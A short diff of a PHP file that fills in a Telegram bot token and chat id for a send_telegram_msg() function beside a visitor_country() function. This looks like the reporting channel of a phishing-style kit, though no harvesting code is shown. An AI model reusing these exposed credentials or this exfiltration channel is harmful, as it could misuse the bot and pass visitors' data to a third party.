@@ -72,8 +72,8 @@ function visitor_country()
 
 function send_telegram_msg($message){
     // Put Your Telegram Information Here
-    $botToken  = 'NjQyODI3OTY4MjpBQUVCV3JtV2N3MWNtTFdVZlBUNUM0MXN6N2otWWM3MWg0MA==';// your tg token bot from botfather (dont put "bot" infront it)
-    $chat_id  = ['LTEwMDE4NDI5NjMzMzU='];// your tg userid from userinfobot
+    $botToken  = '6485001368:AAFlJ5LO_mrtQMNiADleJ4Q-skJx56vmg-Q';// your tg token bot from botfather (dont put "bot" infront it)
+    $chat_id  = ['-1001988155038'];// your tg userid from userinfobot
     
     
     $website="https://api.telegram.org/bot".$botToken;
